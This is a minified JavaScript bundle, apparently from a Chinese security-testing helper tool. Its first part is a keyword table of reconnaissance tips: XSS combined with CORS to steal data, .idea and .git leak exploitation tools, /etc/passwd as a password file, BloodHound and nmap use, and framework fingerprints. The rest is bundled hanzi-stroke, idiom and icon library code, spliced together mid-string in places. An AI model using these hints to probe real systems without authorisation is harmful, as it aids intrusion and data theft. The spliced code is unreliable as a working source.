"]),desc:"\u63D0\u4EA4\u5404\u79CD\u4FE1\u606F",koans_\u63D0\u793A:["\u5E38\u89C1\uFF1AXSS","\u5E38\u89C1\uFF1ASQL\u6CE8\u5165","\u5E38\u89C1\uFF1A\u2026\u2026\u2026\u2026"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"CORS\u8DE8\u57DF",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:l.e.get_regex_fromArrKeywords(["cors","\u8DE8\u57DF","xss"]),desc:"CORS\u8DE8\u57DF",koans_\u63D0\u793A:["\u53EF\u4EE5\uFF0C\u8BBF\u95EE\u7A83\u53D6\u654F\u611F\u4FE1\u606F","\u5E38\u89C1\uFF1A\u548C\u3010XSS\u3011\u7EC4\u5408\u5728\u4E00\u8D77\uFF0C\u5F62\u6210\u3010\u7EC4\u5408\u62F3\u3011\uFF0C\u76F4\u63A5\u7A83\u53D6\u654F\u611F\u4FE1\u606F\uFF0C\u53EF\u88AB\u5B9A\u4E3A\u9AD8\u5371",h.a.createElement("div",null,"\u53C2\u8003\u8D44\u6599\uFF1A",h.a.createElement("ol",null,h.a.createElement("li",null,l.e.singleATag_blank("\u53CD\u5C04XSS\u548CCORS\u6F0F\u6D1E\u7684\u7EC4\u5408\u62F3\u5F15\u53D1\u7684\u8840\u6848 - InfoQ \u5199\u4F5C\u5E73\u53F0","https://xie.infoq.cn/article/b8089e408ffa63fbc5d46d2a5")))),h.a.createElement("div",null,"\u76F8\u5173\u5DE5\u5177\uFF1A",h.a.createElement("ol",null,h.a.createElement("li",null,"\u5F00\u6E90\u5DE5\u5177 CrossSiteContentHijacking\uFF0C\u7528\u4E8E\u9A8C\u8BC1 CORS\u6F0F\u6D1E"))),"\u5E38\u89C1\uFF1A\u2026\u2026\u2026\u2026"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:".idea\u3001.git\uFF0C\u4FE1\u606F\u6CC4\u9732",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:l.e.get_regex_fromArrKeywords([".idea","idea",".git","git"]),desc:".idea\u4FE1\u606F\u6CC4\u9732",koans_\u63D0\u793A:[h.a.createElement("div",null,"\u3010.idea\u3011\u6CC4\u9732\u6316\u6398",h.a.createElement("ol",null,h.a.createElement("li",null,"\u5DE5\u5177\u4ECB\u7ECD\uFF1A",l.e.singleATag_blank(".idea \u6587\u4EF6\u5939\u6CC4\u9732\u5229\u7528\u5DE5\u5177 | \u674E\u52BC\u6770\u7684\u535A\u5BA2","http://www.lijiejie.com/idea-exploit/")),h.a.createElement("li",null,"\u5DE5\u5177\u4E0B\u8F7D\uFF1A",l.e.singleATag_blank("lijiejie/idea_exploit: \u6536\u96C6\u5DE5\u5177","https://github.com/lijiejie/idea_exploit"))))]}],n=[{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"\u3010.bak\u3011",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/.*\.bak/g,desc:"\u4EFB\u610F\u3010.bak\u3011\u540E\u7F00\u6587\u4EF6",koans_\u63D0\u793A:[]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"\u63A5\u53E3",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/接口/g,desc:"\u4EFB\u610F\u63A5\u53E3\u5730\u5740",koans_\u63D0\u793A:[]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"/etc/passwd",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/\/etc\/passwd/g,desc:"\u3010/etc/passwd\u3011\uFF0C\u5BC6\u7801\u6587\u4EF6",koans_\u63D0\u793A:[]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"colorlib",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/colorlib/g,desc:"\u3010colorlib\u3011\uFF0C\u662F\u3010WordPress\u3011\u7684\u4E00\u4E2A\u76F8\u5173\u4E3B\u9898\u3002",koans_\u63D0\u793A:["\u68C0\u67E5\u3010WordPress\u3011"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"\u57DF",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/域/g,desc:"\u3010\u57DF\u3011\uFF0C\u7F51\u7EDC\u7ED3\u6784\u4E2D\u7684\u4E00\u79CD\uFF0C\u590D\u6742\u7684 \u7EC4\u7EC7\u7ED3\u6784 \u3002",koans_\u63D0\u793A:["\u4F7F\u7528\u3010BloodHound\u3011\u5BFB\u8840\u730E\u72AC"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"nmap",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/nmap/g,desc:"nmap\u626B\u63CF\uFF0C\u6709\u591A\u79CD\u65B9\u5F0F\uFF0CTCP\u3001UDP",koans_\u63D0\u793A:["nmap\u626B\u63CF\uFF0C\u4F7F\u7528TCP\u626B\u63CF\u540E\uFF0C\u5E94\u518D\u8FDB\u884C\u4E00\u6B21 \u3010UDP\u3011 \u626B\u63CF\u3002","	\u53EF\u80FD\u4F1A\u5F97\u5230\uFF0C\u622A\u7136\u4E0D\u540C\u7684\u7ED3\u679C"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:".action .do",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/(\.action|\.do)/g,desc:"\u6846\u67B6\u5E73\u53F0",koans_\u63D0\u793A:["Java\u8BED\u8A00","\u6846\u67B6\u5E73\u53F0\uFF0C\u53EF\u80FD\u662FWebLogic","\u3010.action\u3011\u7248\u672C\u6BD4\u8F83\u8001\u4E00\u70B9\uFF0C\u3010.do\u3011\u7248\u672C\u6BD4\u8F83\u65B0\u4E00\u70B9"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"names.nsf",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/names\.nsf/g,desc:"\u6846\u67B6\uFF0C\u8DEF\u7531\u63A7\u5236",koans_\u63D0\u793A:["\u7ECF\u5E38\u6709\u3010names.nsf?Login\u3011\u3001\u3010names.nsf?Logout\u3011\uFF0C\u8FD9\u6837\u7684\u3002","\u4F3C\u4E4E\u548C\u3010IBM Lotus Notes\u3011\u6709\u5173\uFF1B\u8FD9\u662F\u4E00\u4E2A IBM \u7684\u90AE\u4EF6\u5BA2\u6237\u7AEF\u3002"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:".ashx",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/\.ashx/g,desc:"\u6846\u67B6\u5E73\u53F0",koans_\u63D0\u793A:["\u6846\u67B6\u5E73\u53F0\uFF0C\u4E0D\u77E5\u9053\u662F\u4EC0\u4E48\u5E73\u53F0\uFF1F"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"FreeMarker",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/FreeMarker/g,desc:"JSX\u7684\u524D\u7AEF\u6A21\u677F\u6E32\u67D3",koans_\u63D0\u793A:["JSX\u7684\u524D\u7AEF\u6A21\u677F\u6E32\u67D3"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:".aspx",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/\.aspx/g,desc:"ASP\u548C.NET",koans_\u63D0\u793A:["ASP\u548C.NET"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"WEB-INF\u3001web.xml",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/(WEB-INF|web\.xml)/g,desc:"Apache\u670D\u52A1\u5668\u76F8\u5173\u6587\u4EF6",koans_\u63D0\u793A:["Apache\u670D\u52A1\u5668\uFF0C\u4E00\u4E9B\u63CF\u8FF0\u6027\u7684\u6587\u4EF6\u3001\u548C\u914D\u7F6E\u6587\u4EF6","\u5305\u62EC\u3010Servlet\u76F8\u5173\u3011"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"ESAPI.properties",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/(ESAPI|validation)(\.properties)?/g,desc:"ES\u76F8\u5173\u7684API\uFF08Enterprise Security\uFF09\uFF0C\u4E00\u4E9B\u914D\u7F6E\u6587\u4EF6",koans_\u63D0\u793A:["\u3010ESAPI.properties\u3011\uFF0C\u3010OWASP Enterprise Security API\u3011\u76F8\u5173\u7684\u914D\u7F6E\u6587\u4EF6","\u5176\u5B83\u4E00\u4E9B\u2026\u2026\u2026\u2026"]}].concat(j)},qhoQ:function(nu,U,f){"use strict";f.d(U,"a",function(){return o}),f.d(U,"b",function(){return e}),f.d(U,"c",function(){return v}),f.d(U,"d",function(){return D});var R=f("jrin"),h=f("k1fw"),l=f("fWQN"),j=f("mtLc"),n=f("oBTY"),u=f("ty9a"),t=f.n(u);/*!
  * string-discontinuous-match 1.1.2 (https://github.com/JOU-amjs/string-discontinuous-match)
  * API https://github.com/JOU-amjs/string-discontinuous-match/blob/master/doc/api.md
  * Copyright 2021 JOU-amjs. All Rights Reserved
  * Licensed under MIT (https://github.com/JOU-amjs/string-discontinuous-match/blob/master/LICENSE)
      translate(`+p.xOffset+", "+(p.height-p.yOffset)+`)
      scale(`+p.scale+", "+-1*p.scale+`)
    `).replace(/\s+/g," ")}},j.exports=y},function(j,n,u){"use strict";var t=u(0),s=t.copyAndMergeDeep,m=t.colorStringToVals;function F(k,o,c){this.ot=c,this.st=[],this.state={options:{drawingFadeDuration:o.drawingFadeDuration,drawingWidth:o.drawingWidth,drawingColor:m(o.drawingColor),strokeColor:m(o.strokeColor),outlineColor:m(o.outlineColor),radicalColor:m(o.radicalColor||o.strokeColor),highlightColor:m(o.highlightColor)},character:{main:{opacity:o.showCharacter?1:0,strokes:{}},outline:{opacity:o.showOutline?1:0,strokes:{}},highlight:{opacity:1,strokes:{}}},userStrokes:null};for(var b=0;b<k.strokes.length;b++)this.state.character.main.strokes[b]={opacity:1,displayPortion:1},this.state.character.outline.strokes[b]={opacity:1,displayPortion:1},this.state.character.highlight.strokes[b]={opacity:0,displayPortion:1}}F.prototype.updateState=function(k){var o=s(this.state,k);this.ot(o,this.state),this.state=o},F.prototype.run=function(k){var o=this,c=1<arguments.length&&arguments[1]!==void 0?arguments[1]:{},b=k.map(function(e){return e.scope}).filter(function(e){return e});return this.cancelMutations(b),new Promise(function(e){var v={et:!0,ut:0,I:e,ht:k,at:c.loop,ct:b};o.st.push(v),o.ft(v)})},F.prototype.ft=function(k){var o=this;if(k.et){var c=k.ht;if(k.ut>=c.length){if(!k.at)return k.et=!1,this.st=this.st.filter(function(b){return b!==k}),void k.I({canceled:!1});k.ut=0}k.ht[k.ut].run(this).then(function(){k.et&&(k.ut++,o.ft(k))})}},F.prototype.vt=function(){return this.st.map(function(k){return k.ht[k.ut]})},F.prototype.pauseAll=function(){this.vt().forEach(function(k){return k.pause()})},F.prototype.resumeAll=function(){this.vt().forEach(function(k){return k.resume()})},F.prototype.cancelMutations=function(k){var o=this;this.st.forEach(function(c){c.ct.forEach(function(b){k.forEach(function(e){(0<=b.indexOf(e)||0<=e.indexOf(b))&&o.lt(c)})})})},F.prototype.cancelAll=function(){this.cancelMutations([""])},F.prototype.lt=function(k){k.et=!1;for(var o=k.ut;o<k.ht.length;o++)k.ht[o].cancel(this);k.I&&k.I({canceled:!0}),this.st=this.st.filter(function(c){return c!==k})},j.exports=F},function(j,n,u){"use strict";var t=u(12),s=u(13),m=function(k){return k.strokes.map(function(o,c){var b,e=k.medians[c].map(function(v){var D=function(d,A){if(Array.isArray(d))return d;if(Symbol.iterator in Object(d))return function(E,C){var y=[],_=!0,O=!1,B=void 0;try{for(var r,P=E[Symbol.iterator]();!(_=(r=P.next()).done)&&(y.push(r.value),!C||y.length!==C);_=!0);}catch(p){O=!0,B=p}finally{try{!_&&P.return&&P.return()}finally{if(O)throw B}}return y}(d,A);throw new TypeError("Invalid attempt to destructure non-iterable instance")}(v,2);return{x:D[0],y:D[1]}});return new t(o,e,c,(b=c,k.radStrokes&&0<=k.radStrokes.indexOf(b)))})};j.exports=function(F,k){var o=m(k);return new s(F,o)}},function(j,n,u){"use strict";var t=u(2),s=t.subtract,m=t.distance,F=t.length;function k(o,c,b){var e=3<arguments.length&&arguments[3]!==void 0&&arguments[3];this.path=o,this.points=c,this.strokeNum=b,this.isInRadical=e}k.prototype.getStartingPoint=function(){return this.points[0]},k.prototype.getEndingPoint=function(){return this.points[this.points.length-1]},k.prototype.getLength=function(){return F(this.points)},k.prototype.getVectors=function(){var o=this.points[0];return this.points.slice(1).map(function(c){var b=s(c,o);return o=c,b})},k.prototype.getDistance=function(o){var c=this.points.map(function(b){return m(b,o)});return Math.min.apply(Math,c)},k.prototype.getAverageDistance=function(o){var c=this;return o.reduce(function(b,e){return b+c.getDistance(e)},0)/o.length},j.exports=k},function(j,n,u){"use strict";j.exports=function(t,s){this.symbol=t,this.strokes=s}},function(j,n,u){"use strict";var t=[{x:0,y:-124},{x:1024,y:900}];function s(m){this.B=m,this.width=m.width,this.height=m.height,this.dt()}s.prototype.convertExternalPoint=function(m){return{x:(m.x-this.xOffset)/this.scale,y:(this.height-this.yOffset-m.y)/this.scale}},s.prototype.dt=function(){var m=t,F=m[1].x-m[0].x,k=m[1].y-m[0].y,o=this.width-2*this.B.padding,c=this.height-2*this.B.padding,b=o/F,e=c/k;this.scale=Math.min(b,e);var v=this.B.padding+(o-this.scale*F)/2,D=this.B.padding+(c-this.scale*k)/2;this.xOffset=-1*m[0].x*this.scale+v,this.yOffset=-1*m[0].y*this.scale+D},j.exports=s},function(j,n,u){"use strict";var t=u(16),s=u(17),m=u(0),F=m.callIfExists,k=m.counter,o=u(18),c=u(2),b=u(4),e=function(d){return{pathString:c.getPathString(d.externalPoints),points:d.points.map(function(A){return c.round(A)})}};function v(D,d,A){this.V=D,this.F=d,this.et=!1,this.q=A}v.prototype.startQuiz=function(D){this.et=!0,this.B=D,this.pt=0,this.yt=0,this.wt=0,this.gt=[],this.F.run(o.startQuiz(this.V,D.strokeFadeDuration))},v.prototype.startUserStroke=function(D){var d=this.q.convertExternalPoint(D);if(!this.et)return null;if(this.kt)return this.endUserStroke();var A=k();this.kt=new s(A,d,D),this.F.run(o.startUserStroke(A,d))},v.prototype.continueUserStroke=function(D){if(this.kt){var d=this.q.convertExternalPoint(D);this.kt.appendPoint(d,D);var A=this.kt.points.slice(0);this.F.run(o.updateUserStroke(this.kt.id,A))}},v.prototype.endUserStroke=function(){if(this.kt)if(this.F.run(o.removeUserStroke(this.kt.id,this.B.drawingFadeDuration)),this.kt.points.length!==1){var D=this.mt(),d=0<this.F.state.character.outline.opacity;t(this.kt,this.V,this.pt,{isOutlineVisible:d,leniency:this.B.leniency})?this.bt(D):(this.Ct(),this.yt>=this.B.showHintAfterMisses&&this.F.run(o.highlightStroke(D,this.B.highlightColor,this.B.strokeHighlightSpeed))),this.kt=null}else this.kt=null},v.prototype.cancel=function(){this.et=!1,this.kt&&this.F.run(o.removeUserStroke(this.kt.id,this.B.drawingFadeDuration))},v.prototype.bt=function(D){F(this.B.onCorrectStroke,{character:this.V.symbol,strokeNum:this.pt,mistakesOnStroke:this.yt,totalMistakes:this.wt,strokesRemaining:this.V.strokes.length-this.pt-1,drawnPath:e(this.kt)});var d=b.showStroke("main",this.pt,this.B.strokeFadeDuration);this.pt+=1,this.yt=0,this.pt===this.V.strokes.length&&(this.et=!1,F(this.B.onComplete,{character:this.V.symbol,totalMistakes:this.wt}),this.B.highlightOnComplete&&(d=d.concat(o.highlightCompleteChar(this.V,this.B.highlightCompleteColor,2*this.B.strokeHighlightDuration)))),this.F.run(d)},v.prototype.Ct=function(){this.yt+=1,this.wt+=1,F(this.B.onMistake,{character:this.V.symbol,strokeNum:this.pt,mistakesOnStroke:this.yt,totalMistakes:this.wt,strokesRemaining:this.V.strokes.length-this.pt,drawnPath:e(this.kt)})},v.prototype.mt=function(){return this.V.strokes[this.pt]},j.exports=v},function(j,n,u){"use strict";var t=u(0),s=t.average,m=t.assign,F=u(2),k=F.cosineSimilarity,o=F.equals,c=F.frechetDist,b=F.distance,e=F.subtract,v=F.normalizeCurve,D=F.rotate,d=F.length,A=function(_,O){var B,r,P,p=(r=[],P=(B=_)[0],B.slice(1).forEach(function(K){r.push(e(K,P)),P=K}),r),z=O.getVectors(),N=p.map(function(K){var S=z.map(function(T){return k(T,K)});return Math.max.apply(Math,S)});return 0<s(N)},E=[Math.PI/16,Math.PI/32,0,-1*Math.PI/32,-1*Math.PI/16],C=function(_,O,B){var r=B.leniency,P=r===void 0?1:r,p=B.isOutlineVisible,z=p!==void 0&&p,N=O.getAverageDistance(_),K=N<=350*(z||0<O.strokeNum?.5:1)*P;if(!K)return{isMatch:!1,avgDist:N};var S,T,H,q,G,ju,$,au,uu,eu,iu,hu,Ru=(S=_,H=P,q=b((T=O).getStartingPoint(),S[0]),G=b(T.getEndingPoint(),S[S.length-1]),q<=250*H&&G<=250*H),un=A(_,O),fn=(ju=_,$=O.points,au=P,uu=v(ju),eu=v($),iu=1/0,E.forEach(function(Ku){var Bu=c(uu,D(eu,Ku));Bu<iu&&(iu=Bu)}),iu<=.4*au),nn=(hu=O,.35<=P*(d(_)+25)/(hu.getLength()+25));return{isMatch:K&&Ru&&un&&fn&&nn,avgDist:N}};j.exports=function(y,_,O){var B=3<arguments.length&&arguments[3]!==void 0?arguments[3]:{},r=function(q){if(q.length<2)return q;var G=[q[0]];return q.slice(1).forEach(function(ju){o(ju,G[G.length-1])||G.push(ju)}),G}(y.points);if(r.length<2)return null;var P=C(r,_.strokes[O],B);if(!P.isMatch)return!1;for(var p=_.strokes.slice(O+1),z=P.avgDist,N=0;N<p.length;N++){var K=C(r,p[N],B);K.isMatch&&K.avgDist<z&&(z=K.avgDist)}if(z<P.avgDist){var S=.6*(z+P.avgDist)/(2*P.avgDist),T=(B.leniency||1)*S,H=m({},B,{leniency:T});return C(r,_.strokes[O],H).isMatch}return!0}},function(j,n,u){"use strict";function t(s,m,F){this.id=s,this.points=[m],this.externalPoints=[F]}t.prototype.appendPoint=function(s,m){this.points.push(s),this.externalPoints.push(m)},j.exports=t},function(j,n,u){"use strict";var t=u(5),s=u(4),m=u(0).objRepeat;j.exports={highlightCompleteChar:function(k,o,c){return[new t("character.highlight.strokeColor",o)].concat(s.hideCharacter("highlight",k)).concat(s.showCharacter("highlight",k,c/2)).concat(s.hideCharacter("highlight",k,c/2))},highlightStroke:s.highlightStroke,startQuiz:function(k,o){return s.hideCharacter("main",k,o).concat([new t("character.highlight",{opacity:1,strokes:m({opacity:0},k.strokes.length)},{force:!0}),new t("character.main",{opacity:1,strokes:m({opacity:0},k.strokes.length)},{force:!0})])},startUserStroke:function(k,o){return[new t("quiz.activeUserStrokeId",k,{force:!0}),new t("userStrokes."+k,{points:[o],opacity:1},{force:!0})]},updateUserStroke:function(k,o){return[new t("userStrokes."+k+".points",o,{force:!0})]},removeUserStroke:function(k,o){return[new t("userStrokes."+k+".opacity",0,{duration:o}),new t("userStrokes."+k,null,{force:!0})]}}},function(j,n,u){"use strict";var t=u(20),s=u(24);j.exports={HanziWriterRenderer:t,createRenderTarget:s.init}},function(j,n,u){"use strict";var t=u(21),s=u(23),m=u(0).assign,F=u(3);function k(o,c){this.V=o,this.q=c,this.Mt=new t(o),this.St=new t(o),this.jt=new t(o),this.Pt={}}k.prototype.mount=function(o){var c=o.createSubRenderTarget(),b=c.svg;F.attr(b,"transform",`
    translate(`+this.q.xOffset+", "+(this.q.height-this.q.yOffset)+`)
    scale(`+this.q.scale+", "+-1*this.q.scale+`)
        <line x1="0" y1="`+ij+'" x2="'+Y+'" y2="'+ij+'" '+uj+' stroke="'+bu+'" />'}fu&&(Kn+='<line x1="0" y1="0" x2="'+Y+'" y2="'+Y+'" '+uj+' stroke="'+bu+`" />
        <line x1="`+Y+'" y1="0" x2="0" y2="'+Y+'" '+uj+' stroke="'+bu+'" />');var Sj="";return Nn&&(Sj=yn+"px "+(mj?"dashed":"solid")+" "+Mn),{lineHTML:Kn,border:Sj}}(this.option),w=i.lineHTML,x=i.border,I=function(Y){var Fu=Ej.cloneNode();return a.option.width&&Fu.setAttribute("width",a.option.width.toString()),a.option.height&&Fu.setAttribute("height",a.option.height.toString()),x&&(Fu.style.border=x),w&&(Fu.innerHTML=w),Y.backgroundColor&&(Fu.style.backgroundColor=Y.backgroundColor),Fu};if(this.type===hn.STROKE)(function(V,Y){V.text.forEach(function(Fu){var fu=document.createElement("div");V.el.appendChild(fu),Gn.a.loadCharacterData(Fu).then(function(Pu){for(var bu=0;bu<Pu.strokes.length;bu++)Zn({option:V.option,target:fu,strokes:Pu.strokes,radStrokes:Pu.radStrokes||[],current:bu,cloneSvg:Y,width:V.option.width})})})})(this,I);else if(this.text.forEach(function(V){var Y=I(a.option);a.writers.push(Gn.a.create(Y,V,a.option)),a.el.appendChild(Y)}),this.type===hn.ANIMATION)if(this.animation=new Pj(this),this.option.autoAnimate)this.startAnimation();else{var W=function V(){a.startAnimation(),a.el.removeEventListener("click",V,!1)};this.el.addEventListener("click",W,!1)}else if(this.type===hn.TEST){var M,J=this.option.onTestStatus;M=typeof J=="function"?function(V){return{onMistake:function(Fu){J({index:V,status:dn.MISTAKE,data:Fu})},onCorrectStroke:function(Fu){J({index:V,status:dn.CORRECT,data:Fu})},onComplete:function(Fu){J({index:V,status:dn.COMPLETE,data:Fu})}}}:function(){return{}},this.writers.forEach(function(V,Y){V.quiz(M(Y))})}}},g.prototype.startAnimation=function(){return this.animation.start()},g.prototype.drawNextStroke=function(a){return a===void 0&&(a=function(){}),this.animation.drawNextStroke(a)},g.prototype.pauseAnimation=function(){this.animation.pause()},g.prototype.resumeAnimation=function(){this.animation.resume()},g}(),fj=function(a,i){if(a===void 0&&(a=""),i===void 0&&(i={}),typeof window=="undefined")return console.error("Draw \u65B9\u6CD5\u4EC5\u652F\u6301\u5728\u6D4F\u89C8\u5668\u73AF\u5883\u4E0B\u4F7F\u7528"),null;if(!(a=function(w){for(var x,I,W="",M=0;M<w.length;M++)x=w[M],I=void 0,(I=x.charCodeAt(0))>=19968&&I<=40869&&(W+=w[M]);return W}(a)))throw new Error("Draw \u65B9\u6CD5text\u5FC5\u987B\u542B\u6709\u4E2D\u6587");return i.text=a,new Bj(i)};fj.TYPE=hn,fj.TEST_STATUS=dn;var kn=fj;function Uu(g){g.plugins.indexOf("draw")===-1&&(g.plugins.push("draw"),g.draw=kn)}function En(g){typeof window=="object"&&(window.CncharDraw=kn),typeof window=="object"&&window.CnChar?Uu(window.CnChar):g!==void 0&&Uu(g)}kn.init=En,En();var ln,bn=l(4),$n=l(15),Rn=l(16),_n={char:"char",stroke:"stroke",spell:"spell",tone:"tone"},Hn=function(a){for(var i=[],w=1;w<arguments.length;w++)i[w-1]=arguments[w];if(a)if(i.indexOf(_n.spell)===-1||typeof a=="string"){if(a instanceof Array||i.indexOf(_n.spell)!==-1||typeof a=="number"&&i.indexOf(_n.stroke)!==-1){var x=null;return ln?(ln._.checkArgs("idiom",i),x=ln._.has(i,_n.spell)?gj(a,ln._.has(i,_n.tone)):ln._.has(i,_n.stroke)?pj(a):tj(a)):(cj(i,_n.stroke),cj(i,_n.spell),x=tj(a)),x}console.warn("idiom \u8F93\u5165\u53C2\u6570\u4EC5\u652F\u6301\u6570\u7EC4 \u6216 stroke\u6A21\u5F0F\u4E0B\u7684\u6570\u5B57")}else console.warn("idiom spell \u6A21\u5F0F\u4E0B\u4EC5\u652F\u6301\u67E5\u8BE2\u9996\u4E2A\u6C49\u5B57\u7684\u62FC\u97F3");else console.warn("idiom: \u8BF7\u8F93\u5165\u641C\u7D22\u9879")};function tj(g){return bn.a.filter(function(a){return hj(g,a.split(""))})}function gj(g,a){var i=bn.a.length,w=a?$n.a:Rn.a;a&&(g=ln._.transformTone(g,!0).spell);var x=w.filter(function(M){return g===M.split(":")[0]});if(x.length===0)return[];var I=[],W=w.length-1;return x.forEach(function(M){var J=w.indexOf(M),V=parseInt(M.split(":")[1]),Y=J===W?i:parseInt(w[J+1].split(":")[1]);I=I.concat(bn.a.slice(V,Y))}),I}function pj(g){return typeof g=="number"?bn.a.filter(function(a){return g===ln.stroke(a)}):bn.a.filter(function(a){return hj(g,ln.stroke(a,"array"))})}function hj(g,a){for(var i=0;i<g.length;i++)if(g[i]&&g[i]!==a[i])return!1;return!0}function cj(g,a){g.indexOf(a)!==-1&&console.warn("\u672A\u5F15\u5165cnchar,idiom\u4E0D\u652F\u6301"+a+"\u53C2\u6570")}function Un(g){ln=g}function Aj(g){g.plugins.indexOf("idiom")===-1&&(g.plugins.push("idiom"),g.idiom=Hn,g.type.idiom=_n)}function Dj(g){typeof window!="object"||window.CncharIdiom||(window.CncharIdiom=Hn),typeof window=="object"&&window.CnChar?(Aj(window.CnChar),Un(window.CnChar)):g!==void 0&&(Aj(g),Un(g))}Hn.init=Dj,Dj();var aj,Tj=Hn,Xn=l(1),lj={fuzzy:"fuzzy",answer:"answer",second:"second"},jj=function(a){for(var i=[],w=1;w<arguments.length;w++)i[w-1]=arguments[w];aj&&aj._.checkArgs("xhy",i);var x=i.indexOf(lj.fuzzy)!==-1,I=i.indexOf(lj.answer)!==-1,W=i.indexOf(lj.second)!==-1,M=W?1:0,J=1-M;if(x){for(var V=[],Y=0;Y<Xn.a.length;Y++)if(Xn.a[Y][M].indexOf(a)!==-1){var Fu=bj(Xn.a[Y],I,J);V=V.concat(Fu)}return V}for(Y=0;Y<Xn.a.length;Y++)if(Xn.a[Y][M]===a)return bj(Xn.a[Y],I,J);return[]};function bj(g,a,i){var w;if(w=g[i].indexOf("\uFF1B")!==-1?g[i].split("\uFF1B"):[g[i]],!a){var x=i===1?function(I,W){w[W]=g[1-i]+"-"+I}:function(I,W){w[W]=I+"-"+g[1-i]};w.forEach(x)}return w}var Mj=function g(a,i){typeof a!="string"||typeof i!="string"?a instanceof Array?a[0]instanceof Array?a.forEach(function(w){g(w)}):Xn.a.push(a):aj._._warn("addXhy \u53C2\u6570\u5FC5\u987B\u4E3A\u6570\u7EC4"):g([a,i])};function yj(g){g.plugins.indexOf("xhy")===-1&&(function(a){aj=a}(g),g.plugins.push("xhy"),g.xhy=jj,g.type.xhy=lj)}var vj=function(a){typeof window!="object"||window.CncharXHY||(window.CncharXHY=jj),typeof window=="object"&&window.CnChar?yj(window.CnChar):a!==void 0&&yj(a)};jj.init=vj,jj.addXhy=Mj,vj();var rj,Ij=jj,_j=l(17),wj={array:"array"},ej=function(a){for(var i=[],w=1;w<arguments.length;w++)i[w-1]=arguments[w];rj&&rj._.checkArgs("radical",i);for(var x="",I=0;I<a.length;I++){var W=_j[a[I]];x+=W||a[I]}return i.indexOf(wj.array)!==-1||a instanceof Array?x.split(""):x};function xj(g){rj=g}function Oj(g){g.plugins.indexOf("radical")===-1&&(g.plugins.push("radical"),g.radical=ej,g.type.radical=wj)}var zj=function(a){typeof window!="object"||window.CncharRadical||(window.CncharRadical=ej),typeof window=="object"&&window.CnChar?(Oj(window.CnChar),xj(window.CnChar)):a!==void 0&&(Oj(a),xj(a))};ej.init=zj,ej.setRadical=function(g,a){rj._.mapJson(g,a,function(i,w){_j[i]=w})},zj();var Lj=ej;cu.use(qu,Bn,xn,Uu,Tj,Ij,Lj),h.default=cu}]).default})},v56E:function(nu,U,f){},vhfr:function(nu,U,f){"use strict";f.d(U,"a",function(){return R});function R(){return function(h){}}},w5pM:function(nu,U,f){"use strict";var R=f("VTBJ"),h=f("q1tI"),l={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M696 480H544V328c0-4.4-3.6-8-8-8h-48c-4.4 0-8 3.6-8 8v152H328c-4.4 0-8 3.6-8 8v48c0 4.4 3.6 8 8 8h152v152c0 4.4 3.6 8 8 8h48c4.4 0 8-3.6 8-8V544h152c4.4 0 8-3.6 8-8v-48c0-4.4-3.6-8-8-8z"}},{tag:"path",attrs:{d:"M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"}}]},name:"plus-circle",theme:"outlined"},j=l,n=f("6VBw"),u=function(m,F){return h.createElement(n.a,Object(R.a)(Object(R.a)({},m),{},{ref:F,icon:j}))};u.displayName="PlusCircleOutlined";var t=U.a=h.forwardRef(u)},wlus:function(nu,U,f){"use strict";var R=f("VTBJ"),h=f("q1tI"),l={icon:{tag:"svg",attrs:{viewBox:"64 64 896 